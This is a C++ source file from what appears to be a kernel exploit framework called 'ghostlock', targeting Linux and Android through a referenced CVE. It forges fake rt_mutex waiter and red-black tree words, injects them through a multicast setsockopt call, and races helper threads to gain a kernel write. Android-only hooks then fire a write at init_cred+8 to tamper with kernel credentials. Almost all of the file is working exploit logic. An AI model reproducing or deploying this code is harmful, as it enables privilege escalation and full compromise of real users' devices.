#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "memory/payload_builder.h"
#include "route/lock_anchor.h"
#include "route/route_status.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"

using namespace ghostlock;

namespace {
    /* The anchor API's `attempt` argument is log-only: allocate_slot() owns the
     * boot-scoped slot serial. W1 is forced to one attempt on this route
     * (cve_2026_43499_backend.cpp), and the W2 fast-repair stage re-enters it,
     * so keep the number monotonic for the log instead of printing attempt 1
     * every time. */
    int32_t s_anchor_attempt = 0;
} // namespace

namespace ghostlock::route {
    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            status.step = 58;
            status.error_number = EINVAL;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return status;
        }
        const size_t stamp_size = *layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (layout.lock_anchor_image) {
            /* The anchored A-mechanism (docs/analysis/multicast-anchor-plan.md):
             * the walk's fake rt_mutex lives in a zeroed, reference-free .bss
             * region instead of the reclaimed payload page, and the waiter's
             * `task` is init_task -- the same page-free pair the TCP route
             * uses. The tree triple still comes from the request layout (W1's
             * pc is page-address-derived); only the page's *contents* stop
             * mattering for `lock` and `task`. */
            if (!layout.lock_anchor_bytes || !layout.lock_anchor_stride) {
                /* The diting grid (0x1000/0x20) is that build's, not this
                 * profile's. An anchor with no stated grid must not inherit
                 * it: a wrong bound walks past the zeroed region. */
                status.step = 62;
                status.error_number = EINVAL;
                status.userspace_clean = 1;
                status.kernel_disarmed = 1;
                status.code = ROUTE_FALLBACK_SAFE;
                pr_warning("multicast anchor incomplete (image=+0x%llx, bytes=0x%llx, "
                           "stride=0x%llx; 0 = absent): all three keys are required "
                           "and there is no inherited default\n",
                           static_cast<unsigned long long>(*layout.lock_anchor_image),
                           static_cast<unsigned long long>(
                                   layout.lock_anchor_bytes.value_or(0)),
                           static_cast<unsigned long long>(
                                   layout.lock_anchor_stride.value_or(0)));
                return status;
            }
            uintptr_t slot = 0;
            const uintptr_t lock_word = anchor::acquire_lock_word(
                *layout.lock_anchor_image, layout.lock_anchor_bytes,
                layout.lock_anchor_stride, ++s_anchor_attempt, &slot);
            if (lock_word == 0) {
                /* acquire_lock_word logs why. 0 means fail the route: the only
                 * alternatives are a neighbour slot or the payload page, and
                 * neither is this branch's contract. */
                status.step = 63;
                status.error_number = ENOSPC;
                status.userspace_clean = 1;
                status.kernel_disarmed = 1;
                status.code = ROUTE_FALLBACK_SAFE;
                pr_warning("multicast anchor unavailable (image=+0x%llx attempt=%d); "
                           "refusing to walk a neighbour slot or fall back to the page\n",
                           static_cast<unsigned long long>(*layout.lock_anchor_image),
                           s_anchor_attempt);
                return status;
            }
            const memory::PayloadWriteLayout stamp_layout = {
                .parent = (session::g_exploit_session.heap.current.fake_parent),
                .right = (session::g_exploit_session.heap.current.fake_right),
                .left = (session::g_exploit_session.heap.current.fake_left),
            };
            const memory::WaiterTreeStamp tree = memory::waiter_tree_stamp(stamp_layout);
            const memory::WaiterWords words = memory::waiter_words(
                stamp_layout, profile::slide_init_task(), lock_word,
                kernel::waiter_prio_word(
                        kernel::FAKE_WAITER_PRIO,
                        session::g_exploit_session.profile.compact_waiter_has_wake_state()));
            pr_info("[route] tree stamp pc=0x%llx right=0x%llx left=0x%llx target=0x%llx\n",
                    static_cast<unsigned long long>(tree.pc),
                    static_cast<unsigned long long>(tree.right),
                    static_cast<unsigned long long>(tree.left),
                    static_cast<unsigned long long>(request ? request->target : 0));
            pr_info("[route] multicast anchor stamp: image=+0x%llx slot=%llu lock=0x%llx "
                    "task=0x%llx prio=0x%llx tree=0x%llx/0x%llx/0x%llx waiter_off=%d\n",
                    static_cast<unsigned long long>(*layout.lock_anchor_image),
                    static_cast<unsigned long long>(slot),
                    static_cast<unsigned long long>(lock_word),
                    static_cast<unsigned long long>(words.task),
                    static_cast<unsigned long long>(words.prio),
                    static_cast<unsigned long long>(words.tree_pc),
                    static_cast<unsigned long long>(words.tree_right),
                    static_cast<unsigned long long>(words.tree_left),
                    *layout.waiter_offset);
            if (!memory::encode_waiter_words(
                    {reinterpret_cast<std::byte *>(stamp), stamp_size},
                    static_cast<size_t>(*layout.waiter_offset), words)) {
                status.step = 64;
                status.error_number = EOVERFLOW;
                status.userspace_clean = 1;
                status.kernel_disarmed = 1;
                status.code = ROUTE_FALLBACK_SAFE;
                pr_warning("multicast anchor stamp does not fit (waiter=%d buffer=%zu "
                           "strip=%zu): the window cannot hold the eleven words\n",
                           *layout.waiter_offset, stamp_size, memory::kWaiterBytes);
                return status;
            }
        } else if (!memory::encode_multicast_waiter(
                       {reinterpret_cast<std::byte *>(stamp), stamp_size},
                       static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
                       *layout.lock_offset,
                       (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
                       static_cast<size_t>(*layout.task_offset),
                       static_cast<size_t>(*layout.lock_offset), stamp_size);
            return status;
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + 8, &family, sizeof(family));

        int32_t fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (fd < 0) {
            status.step = 60;
            status.error_number = errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        session::g_exploit_session.race.consumer_calls.store(0);
        session::g_exploit_session.race.consumer_success.store(0);
        session::g_exploit_session.race.consumer_stop.store(0);
        session::g_exploit_session.race.route_delay_usec.store(0);
        errno = 0;
        int32_t stamp_result =
                setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
        status.step = 61;
        status.error_number = errno;
        session::g_exploit_session.race.consumer_go.store(1);
        for (int32_t spin = 0; spin < 100000000 &&
                           session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
            __asm__ volatile (


        "yield"
        ::: "memory");
        session::g_exploit_session.race.consumer_go.store(0);
        while (session::g_exploit_session.race.consumer_inflight.load())
            __asm__ volatile (


        "yield"
        ::: "memory");
        close(fd);
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (stamp_result == 0 ||
            session::g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number);
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/route_policy.hpp"

namespace ghostlock::route {
    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
     * defined here because the implementations are Android-only. The one-shot
     * route keeps its own small stack frame in
     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
    bool MulticastPolicy::w2_fast_repair_prebuild(
        session::ExploitSession &exploit_session) noexcept {
        /* Page-free Stage 3: there is no page to prebuild. The repair derives
         * its whole layout from the request (leaf write at init_cred+8), and
         * activate() builds that context in place. */
        if (support::page_free_run()) {
            pr_info("W2 fast repair: page-free, no page to prebuild\n");
            return true;
        }
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        (exploit_session.heap.current.base) =
                support::prepare_good_kernel_page(repair_request);
        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
            pr_warning("W2 fast repair prebuild failed\n");
            support::discard_prebuilt_page();
            return false;
        }
        pr_info("W2 fast repair payload prebuilt\n");
        return true;
    }

    bool MulticastPolicy::w2_fast_repair_activate(
        session::ExploitSession &exploit_session) noexcept {
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        if (support::page_free_run()) {
            /* Page-free Stage 3: no prebuilt page to swap in; the repair's
             * layout is request-derived, so build it and fire the same way. */
            if (!support::prepare_page_free_context(repair_request)) {
                pr_warning("W2 fast repair: page-free context failed\n");
                return false;
            }
            pr_info("W2b: firing init_cred+8 repair (page-free)\n");
        } else {
            if (!support::activate_prebuilt_page()) {
                pr_warning("W2 fast repair activation failed\n");
                return false;
            }
            pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        }
        exploit_session.race.fast_repair.store(1);
        const Status repaired = race::run_main_route_threads(repair_request);
        exploit_session.race.fast_repair.store(0);
        if (!repaired) {
            pr_warning("W2 fast repair route failed\n");
            return false;
        }
        return true;
    }
} // namespace ghostlock::route
#endif
